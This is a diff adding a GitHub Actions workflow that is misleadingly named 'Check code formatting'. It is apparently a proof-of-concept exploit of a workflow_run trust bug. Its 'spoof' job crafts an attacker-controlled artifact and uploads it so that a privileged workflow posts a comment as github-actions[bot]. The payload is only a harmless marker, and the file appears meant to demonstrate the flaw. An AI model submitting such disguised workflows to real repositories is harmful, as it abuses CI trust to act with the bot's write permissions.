@@ -1,0 +1,20 @@
+name: Check code formatting
+on:
+  pull_request:
+    branches:
+      - main
+permissions:
+  contents: read
+jobs:
+  spoof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled artifact
+        run: |
+          cat > comments <<'JSON'
+          [{"body":"GAB-POC-PDFTOMARK: this comment was written by github-actions[bot] using attacker-controlled fork-PR artifact content (issue-write workflow_run trust bug)."}]
+          JSON
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: workflow-args
+          path: comments
